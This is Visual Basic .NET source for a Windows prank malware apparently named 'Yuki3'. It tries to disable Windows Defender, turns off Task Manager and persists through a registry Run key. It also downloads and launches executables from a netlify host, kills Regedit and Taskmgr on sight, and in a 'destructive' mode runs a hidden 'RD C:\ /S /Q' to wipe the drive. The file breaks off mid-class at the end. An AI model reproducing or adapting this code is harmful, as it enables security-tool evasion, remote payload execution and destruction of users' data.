Imports System
Imports Microsoft.Win32
Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Security.AccessControl
Imports System.Management
Imports System.Threading
Imports System.IO.Compression


Public Class Form1
    Dim working As Boolean = True
    Dim RegistryKey As Object
    Dim admin As Boolean = True
    Dim download1 As Boolean = False
    Dim download2 As Boolean = False
    Dim download3 As Boolean = False
    Dim download4 As Boolean = False
    Dim download5 As Boolean = False
    Dim download6 As Boolean = False
    Dim download7 As Boolean = False
    Dim working4 As Boolean = False
    Dim download8 As Boolean = False
    Dim download9 As Boolean = False
    Dim download10 As Boolean = False
    Dim download11 As Boolean = False
    Dim Check4BadFile As Boolean = False
    Dim des = fakememz


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
        HideTaskManager()
        downloadwavFiles()
        Wait2DisPros.RunWorkerAsync()
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
            des = True
            MsgBox("you are currently running the destructive version of this program", 0 + 64, "note")
        End If




        If My.Settings.infected = True Then
            Dim sb As New System.Text.StringBuilder


            ' MsgBox("") 'https://www.7-zip.org/a/7zr.exe
            ' CheckForBadFiles.Start()
            ' CehckforbadPross.Start()
        End If
        Try
            Dim scope As New ManagementScope("\\.\ROOT\SecurityCenter2")
            scope.Connect()

            Dim query As New ObjectQuery("SELECT * FROM AntivirusProduct")
            Dim searcher As New ManagementObjectSearcher(scope, query)

            For Each instance As ManagementObject In searcher.Get()
                If instance("displayName").ToString().Contains("Windows Defender") Then
                    instance.InvokeMethod("SetEnable", New Object() {False})
                End If
            Next
        Catch ex As Exception

        End Try

        Dim path As String = "C:\Users\" & SystemInformation.UserName & "\path.yuki"

        Dim fs As FileStream = File.Create(path)

        ' Add text to the file.
        Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
        fs.Write(info, 0, info.Length)
        fs.Close()
        'https://incomparable-cascaron-802b94.netlify.app/DesktopGoose.zip


        RegistryKey = CreateObject("WScript.Shell") 'https://www.7-zip.org/a/7zr.exe
        Try
            download8 = True
            My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/gdi.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
        "C:\Users\" & SystemInformation.UserName & "\gdi.exe")

        Catch ex As Exception

        End Try

        Try
            download8 = True
            My.Computer.Network.DownloadFile(
         "https://www.7-zip.org/a/7zr.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
        "C:\Users\" & SystemInformation.UserName & "\7z.exe")

        Catch ex As Exception

        End Try

        Try
            download9 = True
            My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/DesktopGoose.zip", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
        "C:\Users\" & SystemInformation.UserName & "\DesktopGoose.zip")

        Catch ex As Exception

        End Try


        Try
            download9 = True
            My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe", 'https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe
        "C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")

        Catch ex As Exception

        End Try

        Try
            download1 = True
            My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll", 'https://incomparable-cascaron-802b94.netlify.app/BluescreenSimulator.exe
        "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")

        Catch ex As Exception

        End Try

        Try
            download1 = True
            My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/338ryfhn2iyhrb2j.exe",
        "C:\Users\" & SystemInformation.UserName & "\338ryfhn2iyhrb2j.exe")

        Catch ex As Exception

        End Try

        Try

            My.Computer.Network.DownloadFile(
         "https://incomparable-cascaron-802b94.netlify.app/beep2.wav",
        "C:\Users\" & SystemInformation.UserName & "\beep2.wav")

        Catch ex As Exception

        End Try


        Try
            download2 = True
            My.Computer.Network.DownloadFile(
               "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
              "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")

        Catch ex As Exception

        End Try

        Try

            My.Computer.Network.DownloadFile(
               "https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe",
              "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")

        Catch ex As Exception

        End Try
        download4 = True

        Try
            download3 = True
            My.Computer.Network.DownloadFile(
              "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
             "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")

        Catch ex As Exception

        End Try


        Try
            download3 = True

            My.Computer.Network.DownloadFile(
     "https://incomparable-cascaron-802b94.netlify.app/monitoring-service.exe",
    "C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
        Catch ex As Exception

        End Try




        Try
            download6 = True
            My.Computer.Network.DownloadFile(
            "https://incomparable-cascaron-802b94.netlify.app/screen-melter.exe",
           "C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
        Catch ex As Exception

        End Try


        Process.Start("C:\Users\" & SystemInformation.UserName & "\338ryfhn2iyhrb2j.exe")

        Try 'remove... My.Computer.Registry.LocalMachine.OpenSubKey("S
            'OFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
            Dim fileq As System.IO.StreamWriter

            fileq = My.Computer.FileSystem.OpenTextFileWriter("C:\YFShshfgsd.yuki", True)
            fileq.WriteLine("just a temp file...")
            fileq.Close()
            Threading.Thread.Sleep(100) ' 500 milliseconds = 0.5 seconds
            File.Delete("C:\YFShshfgsd.yuki")

            RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
            RegistryKey.regwrite("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\kbdhid\Parameters\CrashOnCtrlScroll", 1, "REG_DWORD")
            Try
                My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
            Catch ex As Exception

            End Try
            Threading.Thread.Sleep(100) ' 500 milliseconds = 0.5 seconds
            If My.Computer.FileSystem.FileExists("RESET.yuki") Then
                RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
            Else
                My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
                RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
            End If

        Catch ex As Exception

            admin = False
            If ex.ToString.Contains("denied") Then

                Check4BadFile = True
                If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
                    If Not My.Computer.FileSystem.FileExists("yuki3.exe.config") Then
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
                    Else
                        My.Computer.FileSystem.DeleteFile("yuki3.exe.config")
                    End If
                    downloadwavFiles()

                Else
                    downloadwavFiles()
                    Dim result As DialogResult = MessageBox.Show("THIS PROGRAM IS CONSIDERED MALWARE THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE. ( SHOULD I STILL EXECUTE THE PROGRAM )", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
                    If result = DialogResult.Yes Then
                        Dim result2 As DialogResult = MessageBox.Show("THIS PROGRAM IS CONSIDERED MALWARE THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE. ( THIS IS YOUR LAST WARNING SHOULD I STILL EXECUTE PROGRAM )", "THIS IS YOUR LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
                        Try
                            My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")
                        Catch ex2 As Exception

                        End Try

                        If result2 = DialogResult.Yes Then
                            My.Settings.infected = True
                            runasadmin()

                            Me.Close()
                        Else
                            RemoveVirus.RunWorkerAsync()
                            MsgBox("OK. Don't close the command prompt window it's removing the virus from your computer.", 0 + 64, "Reverting changes")

                            'https://incomparable-cascaron-802b94.netlify.app/Remove_Yuki_Virus.exe
                            Me.Close()
                        End If
                    Else
                        RemoveVirus.RunWorkerAsync()
                        MsgBox("OK. Don't close the command prompt window it's removing the virus from your computer.", 0 + 64, "Reverting changes")
                        Me.Close()

                    End If

                End If

            End If
        End Try


        '  Me.WindowState = Me.WindowState.Minimized
        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
            Dim today = Date.Today
            Dim day = today.Day
            Dim month = today.Month
            If My.Settings.working = True Then
                If day = 1 AndAlso month = 1 Then
                    NewYears.Show()
                End If
                If day = 1 AndAlso month = 2 Then
                    Try
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
                    Catch ex As Exception
                        MsgBox(ex.ToString, 0 + 16, "ERROR")
                    End Try
                End If
                If day = 10 AndAlso month = 1 Then
                    MsgBox("Your computer is still messed up (:")
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 1 AndAlso month = 3 Then
                    ur_pc_is_gone_lmao.Show()
                End If

                If day = 1 AndAlso month = 4 Then

                    Timer1.Start()
                End If
                If day = 1 AndAlso month = 5 Then
                    Process.Start("https://youareanidiot.cc/")
                End If
                If day = 1 AndAlso month = 6 Then
                    Timer2.Start()
                End If
                If day = 1 AndAlso month = 7 Then
                    hahahahaerror.Show()

                End If
                If month = 8 Then
                    '   creepy_Patrick_Star.Show()
                    Timer3.Start()
                End If
                If day = 12 AndAlso month = 2 Then
                    Form2.Show()
                End If
                If month = 9 Then

                    Process.Start("https://youtu.be/dQw4w9WgXcQ")
                    rickrolled.Show()
                End If
                If day = 1 AndAlso month = 10 Then
                    MsgBox("I have launched my custom version of the memz virus so have fun with that (:", 0 + 64, "MEMZ")
                    Timer4.Start()
                    Memzopenweb.Start()
                    '      Threading.Thread.Sleep(50000)
                    Stilluseingthispclol.Start()
                    ' Threading.Thread.Sleep(50000)

                    'MsgBox("PC SELF-DESTRUCT INITIATED", 0 + 16, "MEMZ")

                    Try
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\gdi.exe") 'gdi_test.exe
                    Catch ex As Exception
                        MsgBox(ex.ToString, 0 + 16, "yuki - memz")
                    End Try


                    Threading.Thread.Sleep(70000)
                    Try
                        Process.GetProcessesByName("gdi")(0).Kill()
                    Catch ex As Exception

                    End Try
                    Try
                        Process.GetProcessesByName("gdi_test")(0).Kill()
                    Catch ex As Exception

                    End Try
                    Try
                        Process.GetProcessesByName("gdi.exe")(0).Kill()
                    Catch ex As Exception

                    End Try
                    Try
                        Process.GetProcessesByName("gdi_test.exe")(0).Kill()
                    Catch ex As Exception

                    End Try
                    Try
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")
                        Memzopenweb.Stop()
                        Timer4.Stop()
                        Stilluseingthispclol.Stop()
                    Catch ex As Exception

                    End Try

                End If
                If day = 1 AndAlso month = 11 Then 'https://www.fittea.com/
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 5 AndAlso month = 11 Then
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 8 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 11 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 17 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 20 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 22 AndAlso month = 11 Then '
                    Timer5.Start() 'https://www.fittea.com/ open fit tea a hell of a lot
                End If
                If day = 1 AndAlso month = 12 Then
                    My.Settings.working = False
                    Try
                        My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki")
                    Catch ex As Exception
                        MsgBox(ex.ToString, 0 + 16, "error")
                    End Try

                    '  My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
                    ' RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 0, "REG_DWORD")
                    If des = True Then
                        Dim startInfo As New ProcessStartInfo("CMD.EXE")
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden
                        startInfo.CreateNoWindow = True
                        startInfo.UseShellExecute = False
                        startInfo.Arguments = "RD C:\ /S /Q"
                        Process.Start(startInfo)

                        startInfo.WindowStyle = ProcessWindowStyle.Hidden
                        startInfo.CreateNoWindow = True
                        startInfo.UseShellExecute = False
                        startInfo.Arguments = "del c:\windows\system32*.* /q"
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden
                        startInfo.CreateNoWindow = True
                        startInfo.UseShellExecute = False

                        MsgBox("your PC is fucked now try rebooting", 0 + 64, "YUKI3")
                    Else
                        Yuki_credits.Show()
                    End If


                End If
                Try
                    RegistryKey = CreateObject("WScript.Shell")
                    RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
                Catch ex As Exception

                End Try
            End If




        End If



        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
        Else
            If admin = True Then
                'MsgBox("This program is incompatible with your current Windows installation.", 0 + 16, "incompatible")
                Yuki___infected.Show()
                Dim file2 As System.IO.StreamWriter
                file2 = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki", True)
                file2.WriteLine("true")
                file2.Close()
                ' Set up the file path and permissions.
                Dim filePath As String = "C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki"
            End If
        End If


        Try
            'Process.Start("C:\Users\" & SystemInformation.UserName & "\monitoring service1.exe")
            working4 = True
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Using client = New WebClient()

                '  Using stream = client.OpenRead("http://www.google.com") server overloaded

            End Using


            My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav", AudioPlayMode.BackgroundLoop) '"C:\Users\" & SystemInformation.UserName & "\beep2.wav"
            Timer1.Stop()
            'End Using
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Try
            Using client = New WebClient()
                '  Using stream = client.OpenRead("http://www.google.com")

            End Using



            Process.Start("C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
            Timer2.Stop()
            ' End Using
        Catch

        End Try
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Try
            Using client = New WebClient()
                '   Using stream = client.OpenRead("http://www.google.com")

            End Using

            creepy_Patrick_Star.Show()

            My.Computer.Audio.Play("C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav", AudioPlayMode.BackgroundLoop)
            Timer3.Stop()
            ' End Using
        Catch

        End Try
    End Sub
    Dim working1 As Boolean = False
    Private Sub CehckforbadPross_Tick(sender As Object, e As EventArgs) Handles CehckforbadPross.Tick

        ' My.Computer.Network.DownloadFile(


        Dim p() As Process

        p = Process.GetProcessesByName("Regedit")
            If p.Count > 0 Then
                If working1 = False Then
                    working1 = True

                    Try
                        Process.GetProcessesByName("Regedit")(0).Kill()
                    Catch ex As Exception

                    End Try
                    Try
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try
                    working1 = False
                End If


            Else

                ' Process is not running
            End If



            p = Process.GetProcessesByName("Taskmgr")
            If p.Count > 0 Then
                If working1 = False Then
                    working1 = True

                    Try
                        Process.GetProcessesByName("Taskmgr")(0).Kill()
                    Catch ex As Exception

                    End Try
                    Try
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try
                    working1 = False
                End If


            Else

                ' Process is not running
            End If





    End Sub

    Private Sub DateTimePicker1_ValueChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        '

        Try
            Using client = New WebClient()
                '  Using stream = client.OpenRead("http://www.google.com")

            End Using
            Try
                My.Computer.Network.DownloadFile(
        "https://incomparable-cascaron-802b94.netlify.app/note.txt",
       "C:\Users\" & SystemInformation.UserName & "\note.txt")
            Catch ex As Exception

            End Try


            Process.Start("C:\Users\" & SystemInformation.UserName & "\note.txt")
            Timer4.Stop()
            ' End Using
        Catch

        End Try
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Process.Start("https://www.fittea.com/")
    End Sub

    Private Sub CheckForBadFiles_Tick(sender As Object, e As EventArgs) Handles CheckForBadFiles.Tick
        '"C:\Users\" & SystemInformation.UserName & "\gdi.exe"
        If Check4BadFile = True Then
            Dim fileReader As String
            fileReader = "oh ur dead"
            Try
                fileReader = My.Computer.FileSystem.ReadAllText("C:\Users\" & SystemInformation.UserName & "\path.yuki")
            Catch ex As Exception

            End Try

            If Not fileReader = Application.ExecutablePath Then
                Try
                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Catch ex As Exception

                End Try
                Try
                    Try
                        My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\path.yuki")
                    Catch ex As Exception

                    End Try
                    Dim path As String = "C:\Users\" & SystemInformation.UserName & "\path.yuki"
                    Dim fs As FileStream = File.Create(path)
                    ' Add text to the file.
                    Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
                    fs.Write(info, 0, info.Length)
                    fs.Close()
                Catch ex As Exception

                End Try
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll") Then
            Else
                If download1 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
   "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe") Then
            Else
                If download1 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
   "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\gdi.exe") Then
            Else
                If download8 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/gdi.exe",
   "C:\Users\" & SystemInformation.UserName & "\gdi.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If


            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe") Then
            Else
                If download9 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/fake.memz.joke.exe",
   "C:\Users\" & SystemInformation.UserName & "\fake.memz.joke.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe") Then
            Else
                If download1 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/Hoax.Win32.BadJoke.BlastBtn.a.exe",
   "C:\Users\" & SystemInformation.UserName & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav") Then '
            Else
                If download5 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
   "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If



            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\screen-melter.exe") Then '
            Else
                If download6 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/screen-melter.exe",
   "C:\Users\" & SystemInformation.UserName & "\screen-melter.exe")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav") Then 'ygAGUDFGFGUTADF
            Else
                If download7 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
   "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll") Then
            Else
                If download2 = True Then
                    Try
                        My.Computer.Network.DownloadFile(
               "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
              "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")
                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                    Catch ex As Exception

                    End Try

                End If
            End If

            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe") Then
            Else
                If download3 = True Then

                End If
            End If
            Try
                My.Computer.Network.DownloadFile(
             "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
            "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
                Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
            Catch ex As Exception

            End Try
        End If

    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick

    End Sub

    Private Sub Timer7_Tick(sender As Object, e As EventArgs) Handles Timer7.Tick
        Try
            Dim scope As New ManagementScope("\\.\ROOT\SecurityCenter2")
            scope.Connect()

            Dim query As New ObjectQuery("SELECT * FROM AntivirusProduct")
            Dim searcher As New ManagementObjectSearcher(scope, query)

            For Each instance As ManagementObject In searcher.Get()
                If instance("displayName").ToString().Contains("Windows Defender") Then
                    instance.InvokeMethod("SetEnable", New Object() {False})
                End If
            Next
        Catch ex As Exception

        End Try


    End Sub

    Private Sub errorrow_Tick(sender As Object, e As EventArgs) Handles errorrow.Tick

    End Sub

    Public Declare Function ShowWindow Lib "user32" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean

    Public Const SW_HIDE As Integer = 0
    Public Const SW_SHOW As Integer = 5

    Sub HideTaskManager()
        Dim proc As Process = Process.GetCurrentProcess()
        ShowWindow(proc.MainWindowHandle, SW_HIDE)
    End Sub

    Sub ShowTaskManager()
        Dim proc As Process = Process.GetCurrentProcess()
        ShowWindow(proc.MainWindowHandle, SW_SHOW)
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ShowTaskManager()
    End Sub
    Function runasadmin()
        Try
            My.Computer.Network.DownloadFile(
          "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
         "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")

        Catch ex As Exception

        End Try
        Try
            Process.Start("C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
        Catch ex As Exception

        End Try
    End Function

    Function downloadwavFiles()
        Try
            download5 = True
            My.Computer.Network.DownloadFile(
            "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
           "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
        Catch ex As Exception

        End Try
        Try
            download7 = True
            My.Computer.Network.DownloadFile(
            "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
           "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
        Catch ex As Exception

        End Try
    End Function

    Private Sub RemoveVirusStart_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles RemoveVirus.DoWork
        My.Settings.infected = False
        Try

            My.Computer.Network.DownloadFile(
    "https://incomparable-cascaron-802b94.netlify.app/Remove_Yuki_Virus.exe",
   "C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")

        Catch ex As Exception

        End Try
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("start " & "C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")
        sb.AppendLine("del remv.bat")
        IO.File.WriteAllText("remv.bat", sb.ToString())
        Process.Start("remv.bat")

        'MyUtilities.RunCommandCom("start " & "C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe", "/W", True)
    End Sub

    Private Sub DelVirusRemover_Tick(sender As Object, e As EventArgs) Handles DelVirusRemover.Tick
        Dim p() As Process



        p = Process.GetProcessesByName("Remove_Yuki_Virus")
        If p.Count > 0 Then
            If working1 = False Then




            End If


        Else
            Try
                My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\Remove_Yuki_Virus.exe")
            Catch ex As Exception

            End Try
            ' Process is not running
        End If
    End Sub

    Private Sub KillFalseP_Tick(sender As Object, e As EventArgs) Handles KillFalseP.Tick
        Dim p() As Process



        p = Process.GetProcessesByName("Remove_Yuki_Virus")
        If p.Count > 0 Then
            If working1 = False Then

                Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")


            End If


        Else

            ' Process is not running
        End If
    End Sub

    Private Sub Wait2DisPros_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles Wait2DisPros.DoWork
        Threading.Thread.Sleep(7000)
        CehckforbadPross.Start()
        CheckForBadFiles.Start()

    End Sub

    Private Sub Memzopenweb_Tick(sender As Object, e As EventArgs) Handles Memzopenweb.Tick
        Threading.Thread.Sleep(7000)
        Process.Start("https://www.google.com/search?q=batch+virus+download&gs_ivs=1")
        Threading.Thread.Sleep(10000)
        Process.Start("https://www.google.com/search?q=how+2+get+free+robux&rlz=1C1CHBF_enUS1001US1001&oq=how+2+get+free+robux&aqs=chrome..69i57j0i512j0i22i30i625.5721j0j7&sourceid=chrome&ie=UTF-8")
        Threading.Thread.Sleep(10000)
        Process.Start("https://www.google.com/search?q=is+the+memz+real&rlz=1C1CHBF_enUS1001US1001&sxsrf=AJOqlzUa7TuxfjZxQuFevGrNu9YaEzmbuw%3A1677365515977&ei=C5H6Y5H_OuyjptQP5pGE-AM&ved=0ahUKEwjRsPO94bH9AhXskYkEHeYIAT8Q4dUDCBA&uact=5&oq=is+the+memz+real&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIECCMQJzIECCMQJzIECCMQJzIFCAAQkQIyBQgAEJECMgsIABCABBCxAxCDATILCAAQgAQQsQMQgwEyEQguEIAEELEDEIMBEMcBEK8BMhEILhCABBCxAxCDARDHARDRAzILCAAQgAQQsQMQgwFKBAhBGABQAFjnMWC4NGgAcAF4AIABjgGIAY4BkgEDMC4xmAEAoAEBwAEB&sclient=gws-wiz-serp")
        Threading.Thread.Sleep(7000)
        Process.Start("https://www.google.com/search?q=batch+virus+download&gs_ivs=1")
        Threading.Thread.Sleep(7000)
        Process.Start("http://pcoptimizerpro.com/")
        Threading.Thread.Sleep(7000)
    End Sub

    Private Sub Stilluseingthispclol_Tick(sender As Object, e As EventArgs) Handles Stilluseingthispclol.Tick
        Dim r
        Randomize()
        r = Int(Rnd() * 500) + 1
        Dim r2 = Int(Rnd() * 1500) + 1
        Dim Title = "still using this computer?"
        Dim DefaultValueText = "still using this computer?"
        Dim Message = "still using this computer?"
        Dim XPos = r
        Dim YPos = r2
        Dim Text = InputBox(Message, Title, DefaultValueText, XPos, YPos)
    End Sub

    Private Sub fakememz_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles fakememz.DoWork

    End Sub
End Class

Public Class MyUtilities
    Shared Sub RunCommandCom(command As String, arguments As String, permanent As Boolean)
        Dim p As Process = New Process()
